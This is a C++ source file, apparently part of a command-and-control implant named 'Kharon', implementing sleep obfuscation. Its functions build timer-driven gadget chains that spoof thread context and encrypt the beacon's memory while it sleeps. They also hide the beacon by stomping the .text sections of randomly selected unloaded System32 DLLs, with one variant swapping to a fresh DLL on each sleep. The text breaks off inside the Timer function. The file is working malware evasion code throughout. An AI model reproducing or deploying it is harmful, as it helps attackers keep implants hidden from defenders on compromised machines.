#include <Kharon.h>

using namespace Root;

constexpr UINT16 MAX_CHAIN_ENTRIES = 20;

#define CHAIN_ENTRY( _Chain, _Func, ... )                                       \
    do {                                                                         \
        UINT16 _ic = *(_Chain)->Iterator;                                        \
        switch ( Self->Config.Mask.JmpRegGadget ) {                              \
        case eJmpReg::vRbx:                                                      \
            (_Chain)->Context.Obf[_ic].Rip = U_PTR( Self->Config.Mask.JmpGadget ); \
            (_Chain)->Context.Obf[_ic].Rbx = U_PTR( &_Func );                   \
            break;                                                               \
        case eJmpReg::vRax:                                                      \
            (_Chain)->Context.Obf[_ic].Rip = U_PTR( Self->Config.Mask.JmpGadget ); \
            (_Chain)->Context.Obf[_ic].Rax = U_PTR( _Func );                    \
            break;                                                               \
        case eJmpReg::vRsi:                                                      \
            (_Chain)->Context.Obf[_ic].Rip = U_PTR( Self->Config.Mask.JmpGadget ); \
            (_Chain)->Context.Obf[_ic].Rsi = U_PTR( _Func );                    \
            break;                                                               \
        }                                                                        \
        __VA_ARGS__                                                              \
        *(_Chain)->Iterator = _ic + 1;                                           \
    } while (0)

#define CTX_IC( _Chain ) (_Chain)->Context.Obf[*(_Chain)->Iterator]

auto DECLFN FindDll(
    _In_  ULONG MinTextSize,
    _Out_ PSTOMP_DLL_INFO DllInfo
) -> BOOL {
    G_KHARON

    WCHAR SystemDir[MAX_PATH] = { 0 };
    Self->Krnl32.GetSystemDirectoryW( SystemDir, MAX_PATH );

    WCHAR SearchPath[MAX_PATH] = { 0 };
    Str::CopyW( SearchPath, SystemDir );
    Str::ConcatW( SearchPath, L"\\*.dll" );

    WIN32_FIND_DATAW FindData = { 0 };
    HANDLE hFind = Self->Krnl32.FindFirstFileW( SearchPath, &FindData );
    if ( hFind == INVALID_HANDLE_VALUE )
        return FALSE;

    PVOID*  Candidates     = nullptr;
    WCHAR** CandidatePaths = nullptr;
    ULONG   Count          = 0;
    ULONG   Capacity       = 0;

    PPEB Peb = NtCurrentPeb();

    do {
        if ( FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
            continue;

        WCHAR FullPath[MAX_PATH] = { 0 };
        Str::CopyW( FullPath, SystemDir );
        Str::ConcatW( FullPath, L"\\" );
        Str::ConcatW( FullPath, FindData.cFileName );

        BOOL AlreadyLoaded = FALSE;
        PLIST_ENTRY Head  = &Peb->Ldr->InMemoryOrderModuleList;
        PLIST_ENTRY Entry = Head->Flink;

        while ( Entry != Head ) {
            PLDR_DATA_TABLE_ENTRY Module = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks );
            Entry = Entry->Flink;

            if ( Module->FullDllName.Buffer && Module->FullDllName.Length ) {
                if ( Str::CompareW( Module->FullDllName.Buffer, FullPath ) == 0 ) {
                    AlreadyLoaded = TRUE;
                    break;
                }
            }
        }

        if ( AlreadyLoaded )
            continue;

        HANDLE hFile = Self->Krnl32.CreateFileW(
            FullPath, GENERIC_READ, FILE_SHARE_READ, nullptr,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr
        );
        if ( hFile == INVALID_HANDLE_VALUE )
            continue;

        DWORD FileSize = Self->Krnl32.GetFileSize( hFile, nullptr );
        if ( FileSize < sizeof( IMAGE_DOS_HEADER ) + sizeof( IMAGE_NT_HEADERS ) ) {
            Self->Ntdll.NtClose( hFile );
            continue;
        }

        HANDLE hSection = nullptr;
        NTSTATUS NtStatus = Self->Mm->CreateSection(
            &hSection, SECTION_MAP_READ, nullptr, nullptr,
            PAGE_READONLY, SEC_COMMIT, hFile
        );
        if ( !NT_SUCCESS( NtStatus ) || !hSection ) {
            Self->Ntdll.NtClose( hFile );
            continue;
        }

        PVOID  MapView  = nullptr;
        SIZE_T ViewSize = 0;
        NtStatus = Self->Mm->MapView(
            hSection, NtCurrentProcess(), &MapView, 0, 0,
            nullptr, &ViewSize, ViewUnmap, 0, PAGE_READONLY
        );
        if ( !NT_SUCCESS( NtStatus ) || !MapView ) {
            Self->Ntdll.NtClose( hSection );
            Self->Ntdll.NtClose( hFile );
            continue;
        }

        BOOL Valid = FALSE;

        PIMAGE_DOS_HEADER Dos = C_PTR_AS( PIMAGE_DOS_HEADER, MapView );
        if ( Dos->e_magic == IMAGE_DOS_SIGNATURE ) {
            PIMAGE_NT_HEADERS Nt = C_PTR_AS( PIMAGE_NT_HEADERS, U_PTR( MapView ) + Dos->e_lfanew );
            if ( Nt->Signature == IMAGE_NT_SIGNATURE &&
                 Nt->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ) {

                PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION( Nt );
                for ( WORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
                    if ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
                        if ( Section[i].Misc.VirtualSize >= MinTextSize ) {
                            Valid = TRUE;
                            break;
                        }
                    }
                }
            }
        }

        Self->Mm->UnmapView( NtCurrentProcess(), MapView );
        Self->Ntdll.NtClose( hSection );
        Self->Ntdll.NtClose( hFile );

        if ( !Valid )
            continue;

        if ( Count >= Capacity ) {
            ULONG NewCapacity = Capacity ? Capacity * 2 : 16;
            PVOID*  NewBuf   = (PVOID*)  KhAlloc( NewCapacity * sizeof( PVOID ) );
            WCHAR** NewPaths = (WCHAR**) KhAlloc( NewCapacity * sizeof( WCHAR* ) );
            if ( !NewBuf || !NewPaths ) {
                if ( NewBuf )   KhFree( NewBuf );
                if ( NewPaths ) KhFree( NewPaths );
                continue;
            }

            if ( Candidates ) {
                Mem::Copy( NewBuf, Candidates, Count * sizeof( PVOID ) );
                Mem::Copy( NewPaths, CandidatePaths, Count * sizeof( WCHAR* ) );
                KhFree( Candidates );
                KhFree( CandidatePaths );
            }

            Candidates     = NewBuf;
            CandidatePaths = NewPaths;
            Capacity       = NewCapacity;
        }

        ULONG PathLen = Str::LengthW( FullPath );
        WCHAR* PathCopy = (WCHAR*) KhAlloc( ( PathLen + 1 ) * sizeof( WCHAR ) );
        if ( !PathCopy ) continue;
        Str::CopyW( PathCopy, FullPath );

        CandidatePaths[Count] = PathCopy;
        Candidates[Count]     = nullptr;
        Count++;

    } while ( Self->Krnl32.FindNextFileW( hFind, &FindData ) );

    Self->Krnl32.FindClose( hFind );

    if ( !Count ) {
        KhDbg( "no unloaded DLL found in System32 with .text >= 0x%X bytes", MinTextSize );
        if ( Candidates )     KhFree( Candidates );
        if ( CandidatePaths ) KhFree( CandidatePaths );
        return FALSE;
    }

    ULONG  Index    = Rnd32() % Count;
    WCHAR* DllPath  = CandidatePaths[Index];

    KhDbg( "selected unloaded DLL: %ls (candidate %d/%d)", DllPath, Index + 1, Count );

    HMODULE hDll = Self->Krnl32.LoadLibraryExW( DllPath, nullptr, DONT_RESOLVE_DLL_REFERENCES );
    if ( !hDll ) {
        KhDbg( "failed to load DLL: %ls", DllPath );

        for ( ULONG i = 0; i < Count; i++ )
            KhFree( CandidatePaths[i] );
        KhFree( Candidates );
        KhFree( CandidatePaths );
        return FALSE;
    }

    PIMAGE_DOS_HEADER Dos = C_PTR_AS( PIMAGE_DOS_HEADER, hDll );
    PIMAGE_NT_HEADERS Nt  = C_PTR_AS( PIMAGE_NT_HEADERS, U_PTR( hDll ) + Dos->e_lfanew );
    PIMAGE_SECTION_HEADER Section = IMAGE_FIRST_SECTION( Nt );

    BOOL Result = FALSE;

    for ( WORD i = 0; i < Nt->FileHeader.NumberOfSections; i++ ) {
        if ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) {
            if ( Section[i].Misc.VirtualSize >= MinTextSize ) {
                DllInfo->DllHandle = hDll;
                DllInfo->Base      = (PVOID) hDll;
                DllInfo->TextStart = (PVOID)( U_PTR( hDll ) + Section[i].VirtualAddress );
                DllInfo->TextRVA   = Section[i].VirtualAddress;
                DllInfo->TextSize  = Section[i].Misc.VirtualSize;
                DllInfo->FullSize  = Nt->OptionalHeader.SizeOfImage;

                ULONG PathLenA = Str::LengthW( DllPath ) + 1;
                DllInfo->DllPathc = (CHAR*) KhAlloc( PathLenA );
                if ( DllInfo->DllPathc ) {
                    Str::WCharToChar( DllInfo->DllPathc, DllPath, PathLenA );
                }

                KhDbg( "loaded DLL at %p | .text at %p (RVA 0x%X) [0x%X bytes] | image 0x%X bytes",
                    hDll, DllInfo->TextStart, DllInfo->TextRVA, DllInfo->TextSize, DllInfo->FullSize );

                Result = TRUE;
                break;
            }
        }
    }

    if ( !Result ) {
        Self->Krnl32.FreeLibrary( hDll );
    }

    for ( ULONG i = 0; i < Count; i++ )
        KhFree( CandidatePaths[i] );
    KhFree( Candidates );
    KhFree( CandidatePaths );

    return Result;
}

auto DECLFN Mask::Main(
    _In_ ULONG Time
) -> BOOL {
    KhDbg( "[====== Starting the sleep ======]" );

    if ( ! Time ) return FALSE;

    BOOL  Success = FALSE;
    ULONG RndTime = 0;

    if ( Self->Config.Jitter ) {
        ULONG JitterMnt = ( Self->Config.Jitter * Self->Config.SleepTime ) / 100;
        ULONG SleepMin  = ( Self->Config.SleepTime > JitterMnt ? Self->Config.SleepTime - JitterMnt : 0 );
        ULONG SleepMax  = ( Self->Config.SleepTime + JitterMnt );
        ULONG Range     = ( SleepMax - SleepMin + 1 );

        RndTime = SleepMin + ( Rnd32() % Range );
    } else {
        RndTime = Self->Config.SleepTime;
    }

    KhDbg( "sleep during: %d ms", RndTime );

    switch ( Self->Config.Mask.Beacon ) {
    case eMask::Timer:
        Success = this->Timer( RndTime );

        if ( ! Success ) {
            KhDbg( "timer technique failed, falling back to standard wait" );
            Success = this->Wait( RndTime );
        }

        break;

    case eMask::None:
        Success = this->Wait( RndTime );
        break;
    }

    KhDbg( "[====== Exiting Sleep ======]\n" );

    return Success;
}

auto DECLFN Mask::ChainDefault(
    _Inout_ CHAIN_DATA* Chain
) -> VOID {
    G_KHARON

    PVOID OldProtection = nullptr;

    CHAIN_ENTRY( Chain, Self->Ntdll.NtWaitForSingleObject,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->Event.Start );
        CTX_IC( Chain ).Rdx = FALSE;
        CTX_IC( Chain ).R9  = NULL;
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtGetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Backup );
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtSetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Spoof );
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Self->Session.Base.Start );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
        CTX_IC( Chain ).R8  = PAGE_READWRITE;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    CHAIN_ENTRY( Chain, Self->Cryptbase.SystemFunction040,
        CTX_IC( Chain ).Rcx = U_PTR( Self->Session.Base.Start );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.WaitForSingleObjectEx,
        CTX_IC( Chain ).Rcx = U_PTR( NtCurrentProcess() );
        CTX_IC( Chain ).Rdx = Chain->Time;
        CTX_IC( Chain ).R8  = FALSE;
    );

    CHAIN_ENTRY( Chain, Self->Cryptbase.SystemFunction041,
        CTX_IC( Chain ).Rcx = U_PTR( Self->Session.Base.Start );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Self->Session.Base.Start );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
        CTX_IC( Chain ).R8  = PAGE_EXECUTE_READ;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtSetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Backup );
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.SetEvent,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->Event.End );
    );
}

auto DECLFN Mask::ChainStomp1(
    _Inout_ CHAIN_DATA* Chain
) -> VOID {
    G_KHARON

    PVOID OldProtection   = nullptr;
    STOMP_DLL_INFO* Stomp = Chain->StompInfo;

    CHAIN_ENTRY( Chain, Self->Ntdll.NtWaitForSingleObject,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->Event.Start );
        CTX_IC( Chain ).Rdx = FALSE;
        CTX_IC( Chain ).R9  = NULL;
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtGetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Backup );
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtSetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Spoof );
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->TextStart );
        CTX_IC( Chain ).Rdx = Stomp->TextSize;
        CTX_IC( Chain ).R8  = PAGE_READWRITE;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    CHAIN_ENTRY( Chain, Self->Ntdll._RtlCopyMemory,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->TextStart );
        CTX_IC( Chain ).Rdx = U_PTR( Stomp->DllBackup );
        CTX_IC( Chain ).R8  = Stomp->TextSize;
    );

    CHAIN_ENTRY( Chain, Self->Cryptbase.SystemFunction040,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->BeaconBackup );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->TextStart );
        CTX_IC( Chain ).Rdx = Stomp->TextSize;
        CTX_IC( Chain ).R8  = PAGE_EXECUTE_READ;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.WaitForSingleObjectEx,
        CTX_IC( Chain ).Rcx = U_PTR( NtCurrentProcess() );
        CTX_IC( Chain ).Rdx = Chain->Time;
        CTX_IC( Chain ).R8  = FALSE;
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->TextStart );
        CTX_IC( Chain ).Rdx = Stomp->TextSize;
        CTX_IC( Chain ).R8  = PAGE_READWRITE;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    CHAIN_ENTRY( Chain, Self->Cryptbase.SystemFunction041,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->BeaconBackup );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
    );

    CHAIN_ENTRY( Chain, Self->Ntdll._RtlCopyMemory,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->TextStart );
        CTX_IC( Chain ).Rdx = U_PTR( Stomp->BeaconBackup );
        CTX_IC( Chain ).R8  = Self->Session.Base.Length;
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->TextStart );
        CTX_IC( Chain ).Rdx = Stomp->TextSize;
        CTX_IC( Chain ).R8  = PAGE_EXECUTE_READ;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtSetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Backup );
    );

    CHAIN_ENTRY( Chain, Self->Krnl32.SetEvent,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->Event.End );
    );
}

/*
 * ChainStomp2 — unload/reload DLL variant
 *
 * The replacement DLL is pre-loaded before this chain is built (see Timer()),
 * so NextDll->TextStart already holds the correct post-ASLR address.
 *
 * Chain flow:
 *   1. Wait for start event
 *   2. Capture + spoof main thread context
 *   3. Backup beacon into BeaconBackup
 *   4. Encrypt the beacon backup
 *   5. FreeLibrary the OLD stomped DLL (beacon region becomes invalid)
 *   6. Sleep
 *   7. VirtualProtect(NextDll .text, RW)
 *   8. Decrypt beacon backup
 *   9. Copy beacon into NextDll .text
 *  10. VirtualProtect(NextDll .text, RX)
 *  11. Restore main thread context
 *  12. Signal end event
 */
auto DECLFN Mask::ChainStomp2(
    _Inout_ CHAIN_DATA* Chain
) -> VOID {
    G_KHARON

    PVOID OldProtection   = nullptr;
    STOMP_DLL_INFO* Stomp = Chain->StompInfo;         // current (old) DLL being stomped
    STOMP_DLL_INFO* Next  = Chain->StompInfoNext;     // pre-loaded replacement DLL

    CHAIN_ENTRY( Chain, Self->Ntdll.NtWaitForSingleObject,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->Event.Start );
        CTX_IC( Chain ).Rdx = FALSE;
        CTX_IC( Chain ).R9  = NULL;
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtGetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Backup );
    );

    CHAIN_ENTRY( Chain, Self->Ntdll.NtSetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Spoof );
    );

    // backup beacon from old DLL .text into BeaconBackup
    CHAIN_ENTRY( Chain, Self->Ntdll._RtlCopyMemory,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->BeaconBackup );
        CTX_IC( Chain ).Rdx = U_PTR( Stomp->TextStart );
        CTX_IC( Chain ).R8  = Self->Session.Base.Length;
    );

    // encrypt the beacon backup
    CHAIN_ENTRY( Chain, Self->Cryptbase.SystemFunction040,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->BeaconBackup );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
    );

    // unload the old stomped DLL — beacon region is now gone
    CHAIN_ENTRY( Chain, Self->Krnl32.FreeLibrary,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->DllHandle );
    );

    // sleep
    CHAIN_ENTRY( Chain, Self->Krnl32.WaitForSingleObjectEx,
        CTX_IC( Chain ).Rcx = U_PTR( NtCurrentProcess() );
        CTX_IC( Chain ).Rdx = Chain->Time;
        CTX_IC( Chain ).R8  = FALSE;
    );

    // make the pre-loaded replacement DLL .text writable
    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Next->TextStart );
        CTX_IC( Chain ).Rdx = Next->TextSize;
        CTX_IC( Chain ).R8  = PAGE_READWRITE;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    // decrypt the beacon backup
    CHAIN_ENTRY( Chain, Self->Cryptbase.SystemFunction041,
        CTX_IC( Chain ).Rcx = U_PTR( Stomp->BeaconBackup );
        CTX_IC( Chain ).Rdx = Self->Session.Base.Length;
    );

    // copy beacon into the replacement DLL .text
    CHAIN_ENTRY( Chain, Self->Ntdll._RtlCopyMemory,
        CTX_IC( Chain ).Rcx = U_PTR( Next->TextStart );
        CTX_IC( Chain ).Rdx = U_PTR( Stomp->BeaconBackup );
        CTX_IC( Chain ).R8  = Self->Session.Base.Length;
    );

    // restore RX on the replacement DLL .text
    CHAIN_ENTRY( Chain, Self->Krnl32.VirtualProtect,
        CTX_IC( Chain ).Rcx = U_PTR( Next->TextStart );
        CTX_IC( Chain ).Rdx = Next->TextSize;
        CTX_IC( Chain ).R8  = PAGE_EXECUTE_READ;
        CTX_IC( Chain ).R9  = U_PTR( &OldProtection );
    );

    // restore main thread context
    CHAIN_ENTRY( Chain, Self->Ntdll.NtSetContextThread,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->MainThread );
        CTX_IC( Chain ).Rdx = U_PTR( Chain->Context.Backup );
    );

    // signal completion
    CHAIN_ENTRY( Chain, Self->Krnl32.SetEvent,
        CTX_IC( Chain ).Rcx = U_PTR( Chain->Event.End );
    );
}

auto DECLFN Mask::Timer(
    _In_ ULONG Time
) -> BOOL {
    G_KHARON

    NTSTATUS NtStatus = STATUS_SUCCESS;

    ULONG  DupThreadId      = Self->Td->Rnd();
    HANDLE DupThreadHandle  = nullptr;
    HANDLE MainThreadHandle = nullptr;

    HANDLE Queue      = nullptr;
    HANDLE Timer      = nullptr;
    HANDLE EventTimer = nullptr;
    HANDLE EventStart = nullptr;
    HANDLE EventEnd   = nullptr;

    ULONG  DelayTimer = 0;

    CONTEXT CtxMain = { 0 };
    CONTEXT CtxSpf  = { 0 };
    CONTEXT CtxBkp  = { 0 };

    CONTEXT Ctx[MAX_CHAIN_ENTRIES] = { 0 };
    UINT16  ic = 0;

    STOMP_DLL_INFO StompInfo     = { 0 };
    BOOL           StompReady    = FALSE;

    STOMP_DLL_INFO NextDllInfo   = { 0 };
    BOOL           NextDllReady  = FALSE;

    auto CleanMask = [&]() -> BOOL {
        if ( DupThreadHandle  ) Self->Ntdll.NtClose( DupThreadHandle );
        if ( MainThreadHandle ) Self->Ntdll.NtClose( MainThreadHandle );
        if ( Timer            ) Self->Ntdll.RtlDeleteTimer( Queue, Timer, EventTimer );
        if ( Queue            ) Self->Ntdll.RtlDeleteTimerQueue( Queue );
        if ( EventEnd         ) Self->Ntdll.NtClose( EventEnd );
        if ( EventStart       ) Self->Ntdll.NtClose( EventStart );
        if ( EventTimer       ) Self->Ntdll.NtClose( EventTimer );

        if ( StompReady ) {
            if ( StompInfo.DllBackup )    KhFree( StompInfo.DllBackup );
            if ( StompInfo.BeaconBackup ) KhFree( StompInfo.BeaconBackup );

            if ( Self->Config.Mask.Logic == eChainLogic::Stomping2 && StompInfo.DllHandle ) {
                // old DLL was freed by the chain; don't double-free
            }
        }

        // NextDll cleanup: after a successful chain run the beacon now lives
        // in NextDll, so we must NOT free it. On failure we do free it.
        if ( NextDllReady && !NT_SUCCESS( NtStatus ) ) {
            if ( NextDllInfo.DllHandle ) Self->Krnl32.FreeLibrary( NextDllInfo.DllHandle );
            if ( NextDllInfo.DllPathc  ) KhFree( NextDllInfo.DllPathc );
        }

        if ( !NT_SUCCESS( NtStatus ) ) {
            KhDbg( "memory obfuscation via timer failed: 0x%X", NtStatus );
        }

        return NT_SUCCESS( NtStatus );
    };

    KhDbg( "kharon base at %p [0x%X bytes]", Self->Session.Base.Start, Self->Session.Base.Length );
    KhDbg( "running at thread id: %d | dup thread id: %d", Self->Session.ThreadID, DupThreadId );
    KhDbg( "NtContinue gadget at %p", Self->Config.Mask.NtContinueGadget );
    KhDbg( "jmp gadget at %p", Self->Config.Mask.JmpGadget );

    DupThreadHandle = Self->Td->Open( THREAD_ALL_ACCESS, FALSE, DupThreadId );

    NtStatus = Self->Krnl32.DuplicateHandle(
        NtCurrentProcess(), NtCurrentThread(),
        NtCurrentProcess(), &MainThreadHandle,
        THREAD_ALL_ACCESS, FALSE, 0
    );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    NtStatus = Self->Ntdll.NtCreateEvent( &EventTimer, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    NtStatus = Self->Ntdll.NtCreateEvent( &EventStart, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    NtStatus = Self->Ntdll.NtCreateEvent( &EventEnd, EVENT_ALL_ACCESS, nullptr, NotificationEvent, FALSE );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    NtStatus = Self->Ntdll.RtlCreateTimerQueue( &Queue );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    NtStatus = Self->Ntdll.RtlCreateTimer(
        Queue, &Timer,
        (WAITORTIMERCALLBACKFUNC) Self->Ntdll.RtlCaptureContext,
        &CtxMain, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD
    );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    NtStatus = Self->Ntdll.RtlCreateTimer(
        Queue, &Timer,
        (WAITORTIMERCALLBACKFUNC) Self->Krnl32.SetEvent,
        EventTimer, DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD
    );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    NtStatus = Self->Ntdll.NtWaitForSingleObject( EventTimer, FALSE, NULL );
    if ( ! NT_SUCCESS( NtStatus ) ) return CleanMask();

    CtxSpf.ContextFlags = CONTEXT_ALL;
    CtxBkp.ContextFlags = CONTEXT_ALL;

    Self->Td->GetCtx( DupThreadHandle, &CtxSpf );

    for ( UINT16 i = 0; i < MAX_CHAIN_ENTRIES; i++ ) {
        Mem::Copy( &Ctx[i], &CtxMain, sizeof( CONTEXT ) );
        Ctx[i].Rsp -= sizeof( PVOID );
    }

    if ( Self->Config.Mask.Logic == eChainLogic::Stomping1 ) {

        StompInfo.Base         = Self->Session.Stomp.Base;
        StompInfo.TextStart    = Self->Session.Stomp.TextStart;
        StompInfo.TextSize     = Self->Session.Stomp.TextSize;
        StompInfo.DllHandle    = Self->Session.Stomp.DllHandle;
        StompInfo.FullSize     = Self->Session.Stomp.FullSize;

        StompInfo.DllBackup = KhAlloc( StompInfo.TextSize );
        if ( StompInfo.DllBackup ) {
            Mem::Copy( StompInfo.DllBackup, Self->Session.Stomp.DllBackup, StompInfo.TextSize );
            KhDbg( "stomp1: using existing DLL .text backup [0x%X bytes]", StompInfo.TextSize );
        }

        StompInfo.BeaconBackup = KhAlloc( Self->Session.Base.Length );
        if ( StompInfo.BeaconBackup ) {
            Mem::Copy( StompInfo.BeaconBackup, (PVOID) Self->Session.Base.Start, Self->Session.Base.Length );
            KhDbg( "stomp1: backed up beacon [0x%X bytes] from %p", Self->Session.Base.Length, Self->Session.Base.Start );
        }

        if ( StompInfo.DllBackup && StompInfo.BeaconBackup ) {
            StompReady = TRUE;
        } else {
            KhDbg( "stomp1: backup allocation failed, falling back to default chain" );
            if ( StompInfo.DllBackup )    KhFree( StompInfo.DllBackup );
            if ( StompInfo.BeaconBackup ) KhFree( StompInfo.BeaconBackup );
            Self->Config.Mask.Logic = eChainLogic::Default;
        }
    }

    if ( Self->Config.Mask.Logic == eChainLogic::Stomping2 ) {

        if ( !FindDll( Self->Session.Base.Length, &StompInfo ) ) {
            KhDbg( "stomp2: FindDll failed for current DLL, falling back to default chain" );
            Self->Config.Mask.Logic = eChainLogic::Default;
        } else {
            StompReady = TRUE;

            StompInfo.DllBackup = nullptr;

            StompInfo.BeaconBackup = KhAlloc( Self->Session.Base.Length );
            if ( !StompInfo.BeaconBackup ) {
                KhDbg( "stomp2: beacon backup allocation failed, falling back to default chain" );
                Self->Config.Mask.Logic = eChainLogic::Default;
            } else {
                KhDbg( "stomp2: beacon backup allocated [0x%X bytes]", Self->Session.Base.Length );
            }
        }

        //
        // Pre-load the replacement DLL so its base address and .text
        // pointer are known before the ROP chain is assembled.
        // This avoids needing to capture LoadLibraryA's return value
        // mid-chain which is impossible with the timer-context model.
        //
        if ( Self->Config.Mask.Logic == eChainLogic::Stomping2 ) {
            if ( !FindDll( Self->Session.Base.Length, &NextDllInfo ) ) {
                KhDbg( "stomp2: FindDll failed for replacement DLL, falling back to default chain" );
                if ( StompInfo.BeaconBackup ) KhFree( StompInfo.BeaconBackup );
                Self->Config.Mask.Logic = eChainLogic::Default;
            } else {
                NextDllReady = TRUE;

                KhDbg( "stomp2: pre-loaded replacement DLL at %p | .text at %p [0x%X bytes]",
                    NextDllInfo.DllHandle, NextDllInfo.TextStart, NextDllInfo.TextSize );
            }
        }
    }

    CHAIN_DATA ChainData        = { 0 };
    ChainData.Time              = Time;
    ChainData.Iterator          = &ic;
    ChainData.Event.Start       = EventStart;
    ChainData.Event.End         = EventEnd;
    ChainData.Context.Main      = &CtxMain;
    ChainData.Context.Spoof     = &CtxSpf;
    ChainData.Context.Backup    = &CtxBkp;
    ChainData.Context.Obf       = Ctx;
    ChainData.MainThread        = MainThreadHandle;
    ChainData.StompInfo         = StompReady    ? &StompInfo   : nullptr;
    ChainData.StompInfoNext     = NextDllReady  ? &NextDllInfo : nullptr;

    switch ( Self->Config.Mask.Logic ) {
    case eChainLogic::Default:
        KhDbg( "chain logic: default" );
        this->ChainDefault( &ChainData );
        break;

    case eChainLogic::Stomping1:
        KhDbg( "chain logic: stomping #1 (backup/restore DLL .text)" );
        this->ChainStomp1( &ChainData );
        break;

    case eChainLogic::Stomping2:
        KhDbg( "chain logic: stomping #2 (unload old + pre-loaded replacement)" );
        this->ChainStomp2( &ChainData );
        break;
    }

    for ( UINT16 i = 0; i < ic; i++ ) {
        NtStatus = Self->Ntdll.RtlCreateTimer(
            Queue, &Timer,
            (WAITORTIMERCALLBACKFUNC) Self->Config.Mask.NtContinueGadget,
            &Ctx[i], DelayTimer += 100, 0, WT_EXECUTEINTIMERTHREAD
        );
        if ( !NT_SUCCESS( NtStatus ) ) return CleanMask();
    }

    if ( Self->Config.Mask.Heap ) {
        KhDbg( "obfuscating heap allocations" );
        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );
        Self->Hp->Crypt();
    }

    KhDbg( "triggering obfuscation chain" );

    NtStatus = Self->Ntdll.NtSignalAndWaitForSingleObject( EventStart, EventEnd, FALSE, nullptr );
